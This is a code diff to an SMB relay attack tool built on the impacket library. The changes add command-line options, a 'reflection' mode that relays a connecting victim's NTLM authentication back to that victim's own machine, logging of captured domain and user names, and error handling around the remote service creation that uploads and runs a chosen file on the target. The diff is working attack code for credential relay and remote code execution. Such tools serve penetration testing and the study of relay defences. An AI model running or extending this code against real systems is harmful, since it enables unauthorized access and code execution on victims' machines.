@@ -34,8 +34,9 @@ import types
 import os
 import random
 import time
+import argparse
 
-from impacket import smbserver, smb, ntlm, dcerpc
+from impacket import smbserver, smb, ntlm, dcerpc, version
 from impacket.dcerpc import dcerpc, transport, srvsvc, svcctl
 from smb import *
 from smbserver import *
@@ -82,14 +83,14 @@ class doAttack(Thread):
 
         # Create the service
         command = '%s\\%s' % (path, self.__binary_service_name)
-        resp = self.rpcsvc.CreateServiceW(handle, self.__service_name.encode('utf-16le'), self.__service_name.encode('utf-16le'), command.encode('utf-16le'))
-      
-        if resp['ErrorCode'] == 0:
-            print "OK"
-            return resp['ContextHandle']
-        else:
+        try: 
+            resp = self.rpcsvc.CreateServiceW(handle, self.__service_name.encode('utf-16le'), self.__service_name.encode('utf-16le'), command.encode('utf-16le'))
+        except:
             print "ERROR"
             return None
+        else:
+            print "OK"
+            return resp['ContextHandle']
 
     def openSvcManager(self):
         print "[*] Opening SVCManager on %s....." % self.client.get_remote_host(),
@@ -99,13 +100,14 @@ class doAttack(Thread):
         self._dce.connect()
         self._dce.bind(svcctl.MSRPC_UUID_SVCCTL)
         self.rpcsvc = svcctl.DCERPCSvcCtl(self._dce)
-        resp = self.rpcsvc.OpenSCManagerW()
-        if resp['ErrorCode'] == 0:
-            print "OK"
-            return resp['ContextHandle']
-        else:
+        try:
+            resp = self.rpcsvc.OpenSCManagerW()
+        except:
             print "ERROR" 
             return 0
+        else:
+            print "OK"
+            return resp['ContextHandle']
 
     def copy_file(self, src, tree, dst):
         print "[*] Uploading file %s" % dst
@@ -322,7 +324,8 @@ class SMBClient(smb.SMB):
 class SMBRelayServer:
     def __init__(self):
         self.server = 0
-        self.target = ''
+        self.target = '' 
+        self.mode = 'REFLECTION'
         self.server = smbserver.SMBSERVER(('0.0.0.0',445))
         self.server.processConfigFile('smb.conf')
         self.origSmbComNegotiate = self.server.hookSmbCommand(smb.SMB.SMB_COM_NEGOTIATE, self.SmbComNegotiate)
@@ -332,6 +335,8 @@ class SMBRelayServer:
 
     def SmbComNegotiate(self, connId, smbServer, SMBCommand, recvPacket):
         connData = smbServer.getConnectionData(connId, checkStatus = False)
+        if self.mode.upper() == 'REFLECTION':
+            self.target = connData['ClientIP']
         #############################################################
         # SMBRelay
         smbData = smbServer.getConnectionData('SMBRelay', False)
@@ -339,7 +344,7 @@ class SMBRelayServer:
             # won't work until we have IPC on smbserver (if runs as ForkMixIn)
             print "[!] %s has already a connection in progress" % self.target
         else:
-            print "[*] Initiating connection against target %s..." % self.target,
+            print "[*] Received connection from %s, attacking target %s" % (connData['ClientIP'] ,self.target)
             try: 
                 if recvPacket['Flags2'] & smb.SMB.FLAGS2_EXTENDED_SECURITY == 0:
                     extSec = False
@@ -347,10 +352,9 @@ class SMBRelayServer:
                     extSec = True
                 client = SMBClient(self.target, extended_security = extSec)
             except Exception, e:
-                print "ERROR"
+                print "[!] Connection against target %s FAILED" % self.target
                 print e
             else: 
-                print "OK"
                 encryptionKey = client.get_encryption_key()
                 smbData[self.target] = {} 
                 smbData[self.target]['SMBClient'] = client
@@ -358,7 +362,6 @@ class SMBRelayServer:
                     connData['EncryptionKey'] = encryptionKey
                 smbServer.setConnectionData('SMBRelay', smbData)
                 smbServer.setConnectionData(connId, connData)
-        
         return self.origSmbComNegotiate(connId, smbServer, SMBCommand, recvPacket)
         #############################################################
 
@@ -439,6 +442,9 @@ class SMBRelayServer:
                 smbClient = smbData[self.target]['SMBClient']
                 authData = sessionSetupData['SecurityBlob']
                 clientResponse, errorCode = smbClient.sendAuth(sessionSetupData['SecurityBlob'])                
+                authenticateMessage = ntlm.NTLMAuthChallengeResponse()
+                authenticateMessage.fromString(token)
+
                 if errorCode != STATUS_SUCCESS:
                     # Let's return what the target returned, hope the client connects back again
                     packet = smb.NewSMBPacket()
@@ -454,9 +460,11 @@ class SMBRelayServer:
                     packet['ErrorClass']  = errorCode & 0xff
                     # Reset the UID
                     smbClient.setUid(0)
+                    print "[!] Authenticating against %s as %s\%s FAILED" % (connData['ClientIP'],authenticateMessage['domain_name'], authenticateMessage['user_name'])
                     return None, [packet], errorCode
                 else:
                     # We have a session, create a thread and do whatever we want
+                    print "[*] Authenticating against %s as %s\%s SUCCEED" % (connData['ClientIP'],authenticateMessage['domain_name'], authenticateMessage['user_name'])
                     del (smbData[self.target])
                     clientThread = doAttack(smbClient,self.exeFile)
                     clientThread.start()
@@ -550,19 +558,36 @@ class SMBRelayServer:
     def setExeFile(self, filename):
         self.exeFile = filename
 
+    def setMode(self,mode):
+        self.mode = mode
+
 # Process command-line arguments.
 if __name__ == '__main__':
-    if len(sys.argv) <= 1:
-        print "Usage: %s <target-system> <file-to-execute>" % sys.argv[0]
-        print "For every connection received, this module will try to SMB relay that connection to the target system"
-        print "and execute <file-to-execute> with the credentials obtained"
+
+    print version.BANNER
+    parser = argparse.ArgumentParser(add_help = False, description = "For every connection received, this module will try to SMB relay that connection to the target system or the original client")
+    parser.add_argument("--help", action="help", help='show this help message and exit')
+    parser.add_argument('-m', choices=('relay','reflection'), default='reflection', help="modes of attack (default: reflection)")
+    parser.add_argument('-h', action='store', metavar = 'HOST', help='Host to relay the credentials to when running in -relay mode')
+    parser.add_argument('-e', action='store', required=True, metavar = 'FILE', help='File to execute on the target system')
+
+    try:
+       options = parser.parse_args()
+    except Exception, e:
+       print e
+       sys.exit(1)
+
+    if options.m.upper() == 'RELAY' and options.h is None:
+        print "-h HOST option is needed when running in relay mode"
         sys.exit(1)
 
-    targetSystem = sys.argv[1]
-    exeFile = sys.argv[2]
+    targetSystem = options.h
+    exeFile = options.e
+    mode = options.m
     print "[*] Setting up SMB Server"
     s = SMBRelayServer()
     s.setTargets(targetSystem)
     s.setExeFile(exeFile)
+    s.setMode(mode)
     print "[*] Starting server, waiting for connections"
     s.start() 
